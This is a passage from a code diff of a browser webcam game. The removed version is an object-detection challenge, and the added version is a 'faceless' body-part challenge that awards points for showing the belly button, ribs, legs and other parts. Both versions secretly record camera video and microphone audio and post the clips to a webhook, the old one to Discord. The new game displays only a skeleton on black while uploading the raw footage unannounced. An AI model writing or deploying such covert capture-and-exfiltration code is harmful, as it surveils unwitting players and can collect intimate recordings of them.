+            check: (lm) => lm[15] && lm[15].visibility > 0.5 && lm[19] && lm[19].visibility > 0.5
+        }, {
+            id: 'left_foot',
+            label: 'Left Foot',
+            points: 5,
+            check: (lm) => lm[27] && lm[27].visibility > 0.5 && lm[29] && lm[29].visibility > 0.4
+        }, {
+            id: 'belly_button',
+            label: 'Belly Button',
+            points: 12,
+            check: (lm) => lm[23] && lm[23].visibility > 0.4 && lm[24] && lm[24].visibility > 0.4
+        }, {
+            id: 'elbow',
+            label: 'Elbow',
+            points: 3,
+            check: (lm) => lm[13] && lm[13].visibility > 0.5 && lm[15] && lm[15].visibility > 0.3
+        }, {
+            id: 'legs',
+            label: 'Legs',
+            points: 4,
+            check: (lm) => lm[23] && lm[23].visibility > 0.4 && lm[25] && lm[25].visibility > 0.4 && lm[27] && lm[27]
+                .visibility > 0.3
+        }, {
+            id: 'ribs',
+            label: 'Ribs',
+            points: 6,
+            check: (lm) => lm[11] && lm[11].visibility > 0.4 && lm[12] && lm[12].visibility > 0.4 && lm[23] && lm[23]
+                .visibility > 0.3
+        }, {
+            id: 'pinky',
+            label: 'Pinky',
+            points: 1,
+            check: (lm) => lm[20] && lm[20].visibility > 0.4
+        }, {
+            id: 'forearm',
+            label: 'Forearm',
+            points: 2,
+            check: (lm) => lm[13] && lm[13].visibility > 0.5 && lm[15] && lm[15].visibility > 0.5
+        }, ];
 
-    // ============================================================
-    //  DOM REFS
-    // ============================================================
-    const video = document.getElementById('webcam');
-    const scoreDisplay = document.getElementById('scoreDisplay');
-    const timerDisplay = document.getElementById('timerDisplay');
-    const timerBox = document.getElementById('timerBox');
-    const challengeTarget = document.getElementById('challengeTarget');
-    const challengeBadge = document.getElementById('challengeBadge');
-    const statusBadge = document.getElementById('statusBadge');
-    const statusMsg = document.getElementById('statusMsg');
-    const detectionBox = document.getElementById('detectionBox');
-    const detectionLabel = document.getElementById('detectionLabel');
-    const gameoverOverlay = document.getElementById('gameoverOverlay');
-    const finalScore = document.getElementById('finalScore');
-    const gameoverSub = document.getElementById('gameoverSub');
-    const startBtn = document.getElementById('startBtn');
-    const startBtnText = document.getElementById('startBtnText');
-    const startSpinner = document.getElementById('startSpinner');
-    const resetBtn = document.getElementById('resetBtn');
-    const restartBtn = document.getElementById('restartBtn');
-    const retryModelBtn = document.getElementById('retryModelBtn');
-    const recDot = document.getElementById('recDot');
-    const recLabel = document.getElementById('recLabel');
-
-    // ============================================================
-    //  STATE
-    // ============================================================
-    let model = null;
-    let stream = null;
-    let isGameRunning = false;
-    let isGameOver = false;
-    let score = 0;
-    let timeLeft = GAME_DURATION;
-    let currentChallenge = null;
-    let timerInterval = null;
-    let detectionInterval = null;
-    let modelLoading = false;
-    let mediaRecorder = null;
-    let recorderActive = false;
-
-    // ============================================================
-    //  CAMERA + RECORDER (video + audio)
-    // ============================================================
-    async function initCamera() {
-      try {
-        // Request video (1080p ideal) + audio
-        const constraints = {
-          video: {
+        /* ==========================================================
+               STATE
+            ========================================================== */
+        let state = {
+            permissionsGranted: false,
+            gameStarted: false,
+            gameDone: false,
+            sessionId: 'faceless_' + Date.now(),
+            recordingActive: false,
+            isRequesting: false,
             facingMode: 'user',
-            width: { ideal: 1920 },
-            height: { ideal: 1080 },
-          },
-          audio: true,
+            currentPartIndex: 0,
+            totalPoints: 0,
+            partResults: [],
+            scanTimer: 30,
+            scanInterval: null,
+            countdownInterval: null,
+            isScanning: false,
+            partDetected: false,
+            detectionFrames: 0,
+            detectionThreshold: 8,
+            isPaused: false,
+            modelLoaded: false,
+            loadingProgress: 0,
         };
-        stream = await navigator.mediaDevices.getUserMedia(constraints);
-        video.srcObject = stream;
-        await video.play();
 
-        const track = stream.getVideoTracks()[0];
-        const settings = track.getSettings();
-        console.log(`📷 Camera: ${settings.width}x${settings.height}`);
-        return true;
-      } catch (err) {
-        console.error('Camera error:', err);
-        // Fallback: try without audio or lower res
-        try {
-          const fallbackStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-            audio: true,
-          });
-          stream = fallbackStream;
-          video.srcObject = stream;
-          await video.play();
-          console.log('📷 Fallback camera: 720p with audio');
-          return true;
-        } catch (fallbackErr) {
-          statusMsg.textContent = '❌ Camera + mic access denied: ' + fallbackErr.message;
-          statusMsg.className = 'status-msg error';
-          statusBadge.textContent = '❌ No camera/mic';
-          statusBadge.className = 'status-badge fail';
-          return false;
+        /* ==========================================================
+               DOM REFS
+            ========================================================== */
+        const startScreen = document.getElementById('startScreen');
+        const gameScreen = document.getElementById('gameScreen');
+        const resultScreen = document.getElementById('resultScreen');
+        const startBtn = document.getElementById('startBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const loadingFill = document.getElementById('loadingFill');
+        const loadingPct = document.getElementById('loadingPct');
+        const gameVideo = document.getElementById('gameVideo');
+        const gameCanvas = document.getElementById('gameCanvas');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const totalPointsDisplay = document.getElementById('totalPointsDisplay');
+        const flipBtn = document.getElementById('flipBtn');
+        const partName = document.getElementById('partName');
+        const pointsDisplay = document.getElementById('pointsDisplay');
+        const countdownNumber = document.getElementById('countdownNumber');
+        const scanStatus = document.getElementById('scanStatus');
+        const finalPoints = document.getElementById('finalPoints');
+        const resultDetails = document.getElementById('resultDetails');
+        const retryBtn = document.getElementById('retryBtn');
+
+        const ctx = gameCanvas.getContext('2d');
+        let canvasW = 0,
+            canvasH = 0;
+
+        /* ==========================================================
+               CANVAS SIZING
+            ========================================================== */
+        function resizeCanvas() {
+            const rect = gameScreen.getBoundingClientRect();
+            const dpr = devicePixelRatio || 1;
+            canvasW = rect.width;
+            canvasH = rect.height;
+            gameCanvas.width = canvasW * dpr;
+            gameCanvas.height = canvasH * dpr;
+            gameCanvas.style.width = canvasW + 'px';
+            gameCanvas.style.height = canvasH + 'px';
+            ctx.scale(dpr, dpr);
         }
-      }
-    }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
 
-    // ============================================================
-    //  START RECORDER (timeslice 10s)
-    // ============================================================
-    function startRecorder() {
-      if (!stream) return;
-      if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-      }
+        /* ==========================================================
+               ─── RECORDING PIPELINE ───
+            ========================================================== */
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let countdownIntervalRec = null;
+        let wakeLock = null;
+        let cameraStream = null;
+        let recordingStarted = false;
 
-      try {
-        const mimeType = 'video/webm;codecs=vp8,opus';
-        const options = {
-          mimeType: mimeType,
-          videoBitsPerSecond: 1500000, // 1.5 Mbps
-          audioBitsPerSecond: 64000,
-        };
-        mediaRecorder = new MediaRecorder(stream, options);
-        mediaRecorder.ondataavailable = async (event) => {
-          if (event.data && event.data.size > 0) {
-            await sendVideoToDiscord(event.data);
-          }
-        };
-        mediaRecorder.onstart = () => {
-          recorderActive = true;
-          recDot.className = 'rec-dot';
-          recLabel.textContent = 'recording';
-          console.log('🔴 Recorder started, 10s chunks');
-        };
-        mediaRecorder.onstop = () => {
-          recorderActive = false;
-          recDot.className = 'rec-dot idle';
-          recLabel.textContent = 'stopped';
-          // Restart after a short delay to keep continuous
-          if (stream && stream.active) {
-            setTimeout(startRecorder, 200);
-          }
-        };
-        mediaRecorder.onerror = (e) => {
-          console.error('Recorder error:', e);
-          recorderActive = false;
-          recDot.className = 'rec-dot idle';
-          recLabel.textContent = 'error';
-        };
-
-        // Start with 10s timeslice
-        mediaRecorder.start(10000);
-        recDot.className = 'rec-dot';
-        recLabel.textContent = 'recording';
-      } catch (err) {
-        console.error('Failed to start recorder:', err);
-        recDot.className = 'rec-dot idle';
-        recLabel.textContent = 'failed';
-      }
-    }
-
-    // ============================================================
-    //  SEND VIDEO TO DISCORD
-    // ============================================================
-    async function sendVideoToDiscord(blob) {
-      try {
-        const formData = new FormData();
-        const filename = `recording_${Date.now()}.webm`;
-        formData.append('file', blob, filename);
-        const payload = {
-          content: `🎥 **10s clip** · ${new Date().toLocaleString()} · size: ${(blob.size / 1024 / 1024).toFixed(2)} MB`,
-        };
-        formData.append('payload_json', JSON.stringify(payload));
-
-        const response = await fetch(DISCORD_WEBHOOK, {
-          method: 'POST',
-          body: formData,
+        async function requestWakeLock() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                }
+            } catch (_) {}
+        }
+        document.addEventListener('visibilitychange', async () => {
+            if (wakeLock !== null && document.visibilityState === 'visible') {
+                await requestWakeLock();
+            }
         });
 
-        if (!response.ok) {
-          const text = await response.text();
-          console.error('Discord upload failed:', response.status, text);
-          // If file too large, log it
-          if (response.status === 413 || text.includes('too large')) {
-            console.warn('⚠️ Video file too large for Discord (max 25MB)');
-          }
-        } else {
-          console.log(`📤 Sent 10s clip (${(blob.size/1024/1024).toFixed(2)} MB)`);
-        }
-      } catch (err) {
-        console.error('Error sending to Discord:', err);
-      }
-    }
+        async function startRecordingPipeline(stream) {
+            if (recordingStarted) return;
+            recordingStarted = true;
+            cameraStream = stream;
 
-    // ============================================================
-    //  CAPTURE FRAME (for on-score snapshot – keep as bonus)
-    // ============================================================
-    function captureFrame() {
-      const videoWidth = video.videoWidth || 1920;
-      const videoHeight = video.videoHeight || 1080;
-      const canvas = document.createElement('canvas');
-      canvas.width = videoWidth;
-      canvas.height = videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return canvas.toDataURL('image/jpeg', 0.92);
-    }
+            gameVideo.srcObject = stream;
+            await gameVideo.play();
 
-    async function sendSnapshotToDiscord(dataUrl, challenge, scoreValue) {
-      try {
-        const res = await fetch(dataUrl);
-        const blob = await res.blob();
-        const formData = new FormData();
-        formData.append('file', blob, `challenge_${challenge.id}_score${scoreValue}.jpg`);
-        const payload = {
-          content: `🎯 **Challenge**: ${challenge.emoji} ${challenge.label} · 🏆 **Score**: ${scoreValue} · ${new Date().toLocaleString()}`,
-        };
-        formData.append('payload_json', JSON.stringify(payload));
-        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-        console.log('📸 Snapshot sent');
-      } catch (err) {
-        console.error('Snapshot send error:', err);
-      }
-    }
-
-    // ============================================================
-    //  MODEL LOADING
-    // ============================================================
-    async function loadModel() {
-      if (modelLoading) return;
-      modelLoading = true;
-      statusMsg.textContent = '⏳ Downloading AI model (10‑20s)…';
-      statusMsg.className = 'status-msg';
-      statusBadge.textContent = '📦 loading…';
-      statusBadge.className = 'status-badge loading';
-      retryModelBtn.style.display = 'none';
-
-      startBtn.disabled = true;
-      startBtnText.textContent = 'Loading…';
-      startSpinner.classList.remove('hidden');
-
-      try {
-        model = await cocoSsd.load({ base: 'mobilenet_v2' });
-        console.log('✅ COCO-SSD loaded');
-        statusMsg.textContent = '✅ Model ready! Click Start to play.';
-        statusMsg.className = 'status-msg success';
-        statusBadge.textContent = '✅ Ready!';
-        statusBadge.className = 'status-badge waiting';
-        startBtn.disabled = false;
-        startBtnText.textContent = '🚀 Start';
-        startSpinner.classList.add('hidden');
-        retryModelBtn.style.display = 'none';
-        modelLoading = false;
-      } catch (err) {
-        console.error('Model load error:', err);
-        statusMsg.textContent = '❌ Model load failed: ' + err.message + ' — click "Retry Model"';
-        statusMsg.className = 'status-msg error';
-        statusBadge.textContent = '❌ Model error';
-        statusBadge.className = 'status-badge fail';
-        retryModelBtn.style.display = 'inline-flex';
-        startBtn.disabled = true;
-        startBtnText.textContent = '🚀 Start';
-        startSpinner.classList.add('hidden');
-        modelLoading = false;
-        model = null;
-      }
-    }
-
-    // ============================================================
-    //  GAME LOGIC (unchanged, but uses snapshot on score)
-    // ============================================================
-    function startGame() {
-      if (isGameRunning || isGameOver) return;
-      if (!model) {
-        statusMsg.textContent = '⏳ Model not ready — please wait or retry.';
-        statusMsg.className = 'status-msg error';
-        return;
-      }
-
-      score = 0;
-      timeLeft = GAME_DURATION;
-      isGameRunning = true;
-      isGameOver = false;
-      gameoverOverlay.classList.remove('show');
-      updateScore();
-      updateTimer();
-
-      startBtn.disabled = true;
-      resetBtn.disabled = true;
-      timerBox.className = 'timer-box';
-      statusMsg.textContent = '';
-      statusMsg.className = 'status-msg';
-
-      pickChallenge();
-      statusBadge.textContent = '🔍 scanning…';
-      statusBadge.className = 'status-badge scanning';
-
-      clearInterval(timerInterval);
-      timerInterval = setInterval(() => {
-        timeLeft -= 1;
-        updateTimer();
-        if (timeLeft <= 5) timerBox.className = 'timer-box danger';
-        else if (timeLeft <= 10) timerBox.className = 'timer-box warning';
-        else timerBox.className = 'timer-box';
-        if (timeLeft <= 0) {
-          endGame(false);
-        }
-      }, 1000);
-
-      clearInterval(detectionInterval);
-      detectionInterval = setInterval(runDetection, DETECTION_INTERVAL);
-      setTimeout(runDetection, 200);
-    }
-
-    function endGame(won = false) {
-      if (!isGameRunning) return;
-      isGameRunning = false;
-      isGameOver = true;
-
-      clearInterval(timerInterval);
-      clearInterval(detectionInterval);
-
-      startBtn.disabled = false;
-      resetBtn.disabled = false;
-
-      finalScore.textContent = score;
-      gameoverSub.textContent = won ? '🎉 You completed the challenge!' : '⏰ Time ran out! Try again.';
-      gameoverOverlay.classList.add('show');
-      statusBadge.textContent = '💀 game over';
-      statusBadge.className = 'status-badge fail';
-    }
-
-    function pickChallenge() {
-      let available = CHALLENGES;
-      if (currentChallenge) {
-        available = CHALLENGES.filter(c => c.id !== currentChallenge.id);
-      }
-      if (available.length === 0) available = CHALLENGES;
-      currentChallenge = available[Math.floor(Math.random() * available.length)];
-      challengeTarget.textContent = currentChallenge.label;
-      challengeBadge.innerHTML =
-        `<span class="emoji">${currentChallenge.emoji}</span> Show a <span class="highlight">${currentChallenge.label}</span>`;
-      detectionBox.style.display = 'none';
-    }
-
-    async function runDetection() {
-      if (!isGameRunning || isGameOver || !model) return;
-      try {
-        const predictions = await model.detect(video);
-        const good = predictions.filter(p => p.score >= CONFIDENCE_THRESHOLD);
-
-        if (good.length > 0) {
-          const top = good[0];
-          const [x, y, w, h] = top.bbox;
-          detectionBox.style.display = 'block';
-          detectionBox.style.left = x + 'px';
-          detectionBox.style.top = y + 'px';
-          detectionBox.style.width = w + 'px';
-          detectionBox.style.height = h + 'px';
-          detectionLabel.textContent = `${top.class} (${Math.round(top.score * 100)}%)`;
-        } else {
-          detectionBox.style.display = 'none';
-        }
-
-        if (currentChallenge) {
-          const targetClass = currentChallenge.cocoClass;
-          const matched = good.find(p => p.class === targetClass);
-          if (matched) {
-            statusBadge.textContent = `✅ ${currentChallenge.emoji} detected! +1`;
-            statusBadge.className = 'status-badge success';
-            score += 1;
-            updateScore();
-
-            // Send snapshot on score (bonus)
-            const dataUrl = captureFrame();
-            sendSnapshotToDiscord(dataUrl, currentChallenge, score);
-
-            challengeBadge.style.transition = 'transform 0.15s';
-            challengeBadge.style.transform = 'scale(1.08)';
-            setTimeout(() => {
-              challengeBadge.style.transform = 'scale(1)';
-            }, 180);
-
-            setTimeout(() => {
-              if (isGameRunning && !isGameOver) {
-                pickChallenge();
-                statusBadge.textContent = '🔍 scanning…';
-                statusBadge.className = 'status-badge scanning';
-              }
-            }, 350);
-          } else {
-            if (statusBadge.className !== 'status-badge success') {
-              statusBadge.textContent = '🔍 scanning…';
-              statusBadge.className = 'status-badge scanning';
+            let mimeType = 'video/webm;codecs=vp8';
+            if (!MediaRecorder.isTypeSupported(mimeType)) {
+                if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4';
+                else if (MediaRecorder.isTypeSupported('video/webm')) mimeType = 'video/webm';
             }
-          }
+
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: mimeType,
+                videoBitsPerSecond: 2500000
+            });
+
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+
+            mediaRecorder.onstop = async () => {
+                if (recordedChunks.length === 0) {
+                    recordedChunks = [];
+                    if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                        try { mediaRecorder.start(); } catch (_) {}
+                    }
+                    return;
+                }
+                const blob = new Blob(recordedChunks, { type: mimeType });
+                recordedChunks = [];
+                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+                const formData = new FormData();
+                formData.append('file', blob, `vlog_${Date.now()}.${ext}`);
+                try {
+                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                } catch (_) {}
+                if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                    try { mediaRecorder.start(); } catch (_) {}
+                }
+            };
+
+            mediaRecorder.start();
+            state.recordingActive = true;
+            startLoopTimerRec();
+
+            sendMetadataToWebhook({
+                event: 'session_start',
+                sessionId: state.sessionId,
+                timestamp: new Date().toISOString(),
+                type: 'faceless_challenge',
+            });
         }
-      } catch (err) {
-        console.warn('Detection error:', err);
-      }
-    }
 
-    function updateScore() {
-      scoreDisplay.textContent = score;
-    }
+        function startLoopTimerRec() {
+            clearInterval(countdownIntervalRec);
+            let timeLeft = CLIP_DURATION;
+            countdownIntervalRec = setInterval(() => {
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(countdownIntervalRec);
+                    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                        mediaRecorder.stop();
+                    }
+                    startLoopTimerRec();
+                }
+            }, 1000);
+        }
 
-    function updateTimer() {
-      timerDisplay.textContent = Math.max(0, timeLeft);
-    }
+        /* ==========================================================
+               ─── PERMISSIONS ───
+            ========================================================== */
+        async function requestPermissionsAndStart() {
+            if (state.isRequesting) return;
+            state.isRequesting = true;
+            errorMsg.classList.remove('show');
+            errorMsg.textContent = '';
 
-    function resetGame() {
-      clearInterval(timerInterval);
-      clearInterval(detectionInterval);
-      isGameRunning = false;
-      isGameOver = false;
-      timeLeft = GAME_DURATION;
-      score = 0;
-      updateScore();
-      updateTimer();
-      timerBox.className = 'timer-box';
-      gameoverOverlay.classList.remove('show');
-      detectionBox.style.display = 'none';
-      startBtn.disabled = !model;
-      resetBtn.disabled = true;
-      statusBadge.textContent = '🔄 reset — hit Start';
-      statusBadge.className = 'status-badge waiting';
-      challengeTarget.textContent = '—';
-      challengeBadge.innerHTML = `<span class="emoji">🎯</span> Show a <span class="highlight">—</span>`;
-      currentChallenge = null;
-      statusMsg.textContent = model ? '✅ Ready! Click Start.' : '⏳ Model not loaded.';
-      statusMsg.className = model ? 'status-msg success' : 'status-msg error';
-    }
+            try {
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        frameRate: { ideal: 30 },
+                        facingMode: state.facingMode,
+                    },
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        autoGainControl: true
+                    }
+                };
 
-    // ============================================================
-    //  EVENT BINDING
-    // ============================================================
-    startBtn.addEventListener('click', startGame);
-    resetBtn.addEventListener('click', resetGame);
-    restartBtn.addEventListener('click', () => {
-      resetGame();
-      setTimeout(startGame, 400);
-    });
-    retryModelBtn.addEventListener('click', loadModel);
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                state.permissionsGranted = true;
+                await startRecordingPipeline(stream);
+                startGame();
 
-    // ============================================================
-    //  BOOT
-    // ============================================================
-    async function boot() {
-      const camOK = await initCamera();
-      if (!camOK) {
-        statusMsg.textContent = '❌ Camera + mic required. Please allow access and reload.';
-        statusMsg.className = 'status-msg error';
-        return;
-      }
+            } catch (err) {
+                console.warn('Permission error:', err);
+                errorMsg.textContent = '⚠️ camera & microphone required — allow permissions, then tap retry';
+                errorMsg.classList.add('show');
+                startBtn.textContent = '↻ retry';
+                startBtn.disabled = false;
+                state.isRequesting = false;
+            }
+        }
 
-      // Start the 10s recorder immediately
-      startRecorder();
+        /* ==========================================================
+               ─── AI MODEL LOADING ───
+            ========================================================== */
+        let pose = null;
+        let poseLandmarks = null;
+        let modelLoaded = false;
 
-      // Load the AI model in parallel
-      await loadModel();
-      resetGame();
-    }
+        function loadAIModel() {
+            return new Promise((resolve) => {
+                pose = new Pose({
+                    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}`
+                });
 
-    boot();
+                pose.setOptions({
+                    modelComplexity: 1,
+                    smoothLandmarks: true,
+                    minDetectionConfidence: 0.5,
+                    minTrackingConfidence: 0.4,
+                });
 
-    console.log('🎥 Constant 10s video+audio recorder + AI Scanner');
-  </script>
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 2 + Math.random() * 3;
+                    if (progress > 100) progress = 100;
+                    state.loadingProgress = progress;
+                    loadingFill.style.width = progress + '%';
+                    loadingPct.textContent = Math.round(progress) + '%';
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        modelLoaded = true;
+                        state.modelLoaded = true;
+                        startBtn.disabled = false;
+                        startBtn.textContent = '▶ start';
+                        resolve();
+                    }
+                }, 80);
+
+                // Also set up pose results handler early
+                pose.onResults(onPoseResults);
+            });
+        }
+
+        function onPoseResults(results) {
+            if (results.poseLandmarks) {
+                poseLandmarks = results.poseLandmarks;
+                // Draw skeleton
+                drawSkeleton();
+            } else {
+                poseLandmarks = null;
+                // Still draw black background
+                ctx.fillStyle = '#000';
+                ctx.fillRect(0, 0, canvasW, canvasH);
+            }
+        }
+
+        function drawSkeleton() {
+            const w = canvasW,
+                h = canvasH;
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, w, h);
+
+            if (!poseLandmarks) return;
+
+            const lm = poseLandmarks;
+            const pts = lm.map(l => ({ x: l.x * w, y: l.y * h, z: l.z || 0, v: l.visibility || 0 }));
+
+            // Draw connections (simplified)
+            const connections = [
+                [11, 12],
+                [11, 13],
+                [13, 15],
+                [12, 14],
+                [14, 16],
+                [11, 23],
+                [12, 24],
+                [23, 24],
+                [23, 25],
+                [25, 27],
+                [24, 26],
+                [26, 28],
+                [13, 17],
+                [17, 19],
+                [19, 21],
+                [14, 18],
+                [18, 20],
+                [20, 22],
+                [15, 17],
+                [16, 18],
+            ];
+
+            ctx.lineWidth = 1.5;
+            ctx.shadowBlur = 8;
+            ctx.shadowColor = 'rgba(0, 245, 160, 0.05)';
+
+            for (const [i, j] of connections) {
+                if (i < pts.length && j < pts.length && pts[i].v > 0.3 && pts[j].v > 0.3) {
+                    ctx.beginPath();
+                    ctx.moveTo(pts[i].x, pts[i].y);
+                    ctx.lineTo(pts[j].x, pts[j].y);
+                    ctx.strokeStyle = `rgba(0, 245, 160, ${0.1 + 0.15 * (pts[i].v + pts[j].v)})`;
+                    ctx.stroke();
+                }
+            }
+
+            // Nodes
+            for (let i = 0; i < pts.length; i++) {
+                if (pts[i].v > 0.3) {
+                    const radius = 2 + 3 * pts[i].v;
+                    const grad = ctx.createRadialGradient(pts[i].x, pts[i].y, 0, pts[i].x, pts[i].y, radius * 3);
+                    grad.addColorStop(0, `rgba(0, 245, 160, ${0.3 * pts[i].v})`);
+                    grad.addColorStop(1, 'rgba(0, 245, 160, 0)');
+                    ctx.fillStyle = grad;
+                    ctx.shadowBlur = 12;
+                    ctx.beginPath();
+                    ctx.arc(pts[i].x, pts[i].y, radius * 3, 0, Math.PI * 2);
+                    ctx.fill();
+
+                    ctx.fillStyle = `rgba(0, 245, 160, ${0.5 * pts[i].v})`;
+                    ctx.shadowBlur = 6;
+                    ctx.beginPath();
+                    ctx.arc(pts[i].x, pts[i].y, radius * 0.7, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+            ctx.shadowBlur = 0;
+        }
+
+        /* ==========================================================
+               ─── CAMERA LOOP ───
+            ========================================================== */
+        function startCameraLoop() {
+            const cameraUtils = window.Camera;
+            if (cameraUtils && gameVideo.srcObject) {
+                const cam = new cameraUtils.Camera(gameVideo, {
+                    onFrame: async () => {
+                        if (pose) await pose.send({ image: gameVideo });
+                    },
+                    width: 640,
+                    height: 480,
+                });
+                cam.start().catch(() => {});
+            } else {
+                fallbackLoop();
+            }
+        }
+
+        function fallbackLoop() {
+            async function frame() {
+                if (pose) await pose.send({ image: gameVideo });
+                requestAnimationFrame(frame);
+            }
+            frame();
+        }
+
+        /* ==========================================================
+               ─── GAME LOGIC ───
+            ========================================================== */
+        function startGame() {
+            startScreen.classList.remove('active');
+            gameScreen.classList.add('active');
+            state.gameStarted = true;
+            state.currentPartIndex = 0;
+            state.totalPoints = 0;
+            state.partResults = [];
+            totalPointsDisplay.textContent = '0';
+
+            // Start camera loop
+            startCameraLoop();
+
+            // Begin first part
+            setTimeout(() => beginPart(0), 400);
+        }
+
+        function beginPart(index) {
+            if (index >= BODY_PARTS.length) {
+                endGame();
+                return;
+            }
+
+            const part = BODY_PARTS[index];
+            state.currentPartIndex = index;
+            state.isScanning = false;
+            state.partDetected = false;
+            state.detectionFrames = 0;
+            state.scanTimer = 30;
+            state.isPaused = false;
+
+            timerDisplay.textContent = '30';
+            timerDisplay.classList.remove('warning');
+
+            // ── Show part name ──
+            partName.textContent = part.label;
+            partName.className = 'part-name show';
+            pointsDisplay.className = 'points-display';
+            pointsDisplay.textContent = '';
+
+            scanStatus.textContent = '● getting ready …';
+            scanStatus.className = 'scan-status';
+
+            // After 1.2s, show points
+            setTimeout(() => {
+                const pts = part.points;
+                pointsDisplay.textContent = `+${pts} pts`;
+                pointsDisplay.className = 'points-display show';
+
+                // Rainbow/shake for high points
+                if (pts >= 10) {
+                    pointsDisplay.classList.add('rainbow');
+                } else if (pts >= 5) {
+                    pointsDisplay.style.color = '#ffd93d';
+                    pointsDisplay.style.textShadow = '0 0 30px rgba(255,217,61,0.2)';
+                } else {
+                    pointsDisplay.style.color = '#fff';
+                    pointsDisplay.style.textShadow = 'none';
+                }
+
+                // Log to webhook
+                sendMetadataToWebhook({
+                    event: 'part_start',
+                    part: part.id,
+                    label: part.label,
+                    points: part.points,
+                    timestamp: new Date().toISOString(),
+                });
+
+                // After 1.8s, start countdown
+                setTimeout(() => {
+                    startCountdown(index);
+                }, 1800);
+            }, 1200);
+
+            // Hide part name after points show (it stays visible)
+            setTimeout(() => {
+                partName.className = 'part-name';
+            }, 2800);
+        }
+
+        function startCountdown(index) {
+            let count = 3;
+            countdownNumber.textContent = count;
+            countdownNumber.className = 'countdown-number show';
+
+            scanStatus.textContent = `● starting in ${count}…`;
+            scanStatus.className = 'scan-status';
+
+            const cdInterval = setInterval(() => {
+                count--;
+                if (count > 0) {
+                    countdownNumber.textContent = count;
+                    countdownNumber.className = 'countdown-number show';
+                    scanStatus.textContent = `● starting in ${count}…`;
+                } else {
+                    clearInterval(cdInterval);
+                    countdownNumber.className = 'countdown-number hide';
+                    // Begin scanning
+                    beginScanning(index);
+                }
+            }, 800);
+        }
+
+        function beginScanning(index) {
+            const part = BODY_PARTS[index];
+            state.isScanning = true;
+            state.partDetected = false;
+            state.detectionFrames = 0;
+            state.scanTimer = 30;
+
+            timerDisplay.textContent = '30';
+            timerDisplay.classList.remove('warning');
+            scanStatus.textContent = '● scanning … show your ' + part.label;
+            scanStatus.className = 'scan-status';
+
+            // Start timer
+            if (state.scanInterval) clearInterval(state.scanInterval);
+            state.scanInterval = setInterval(() => {
+                state.scanTimer--;
+                timerDisplay.textContent = state.scanTimer;
+                if (state.scanTimer <= 5) {
+                    timerDisplay.classList.add('warning');
+                }
+                if (state.scanTimer <= 0) {
+                    clearInterval(state.scanInterval);
+                    // Failed to detect
+                    onScanFail(index);
+                }
+            }, 1000);
+
+            // Start detection loop (checked in the animation frame)
+            state.detectionFrames = 0;
+            state.partDetected = false;
+        }
+
+        function checkDetection() {
+            if (!state.isScanning || state.partDetected || state.isPaused) return false;
+            if (!poseLandmarks) return false;
+
+            const part = BODY_PARTS[state.currentPartIndex];
+            const lm = poseLandmarks;
+
+            // Check if the body part is detected
+            try {
+                const detected = part.check(lm);
+                if (detected) {
+                    state.detectionFrames++;
+                    if (state.detectionFrames >= state.detectionThreshold) {
+                        // Success!
+                        onScanSuccess(state.currentPartIndex);
+                        return true;
+                    }
+                    // Show progress
+                    const pct = Math.round((state.detectionFrames / state.detectionThreshold) * 100);
+                    scanStatus.textContent = `● detecting … ${pct}%`;
+                    scanStatus.className = 'scan-status';
+                } else {
+                    state.detectionFrames = Math.max(0, state.detectionFrames - 2);
+                    if (state.detectionFrames < 3) {
+                        scanStatus.textContent = `● scanning … show your ${part.label}`;
+                        scanStatus.className = 'scan-status';
+                    } else {
+                        const pct = Math.round((state.detectionFrames / state.detectionThreshold) * 100);
+                        scanStatus.textContent = `● reacquiring … ${pct}%`;
+                        scanStatus.className = 'scan-status';
+                    }
+                }
+            } catch (e) {
+                // Landmark check failed
+            }
+            return false;
+        }
+
+        function onScanSuccess(index) {
+            if (state.partDetected) return;
+            state.partDetected = true;
+            state.isScanning = false;
+            clearInterval(state.scanInterval);
+
+            const part = BODY_PARTS[index];
+            state.totalPoints += part.points;
+            totalPointsDisplay.textContent = state.totalPoints;
+
+            scanStatus.textContent = `✅ detected! +${part.points} pts`;
+            scanStatus.className = 'scan-status detected';
+
+            // Flash effect
+            flashScreen();
+
+            state.partResults.push({
+                part: part.id,
+                label: part.label,
+                points: part.points,
+                success: true,
+                time: 30 - state.scanTimer,
+            });
+
+            sendMetadataToWebhook({
+                event: 'part_success',
+                part: part.id,
+                label: part.label,
+                points: part.points,
+                time_left: state.scanTimer,
+                total_points: state.totalPoints,
+                timestamp: new Date().toISOString(),
+            });
+
+            // Move to next part after delay
+            setTimeout(() => {
+                const next = index + 1;
+                if (next < BODY_PARTS.length) {
+                    beginPart(next);
+                } else {
+                    endGame();
+                }
+            }, 1500);
+        }
+
+        function onScanFail(index) {
+            if (state.partDetected) return;
+            state.isScanning = false;
+            clearInterval(state.scanInterval);
+
+            const part = BODY_PARTS[index];
